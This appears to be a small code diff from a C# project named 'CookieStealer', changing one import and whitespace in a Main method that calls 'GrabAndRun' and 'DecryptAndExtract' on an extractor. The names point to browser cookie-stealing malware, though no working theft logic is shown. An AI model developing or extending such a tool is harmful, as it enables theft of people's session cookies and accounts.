@@ -1,4 +1,4 @@
-﻿using CookieStealer.Cookies;
+﻿using CookieStealer.Utilities;
 
 namespace CookieStealer;
 
@@ -7,7 +7,7 @@ internal static class Program
     private static void Main()
     {
         Console.Clear();
-        
+
         var extractor = new Extractor();
         extractor.GrabAndRun();
         extractor.DecryptAndExtract();
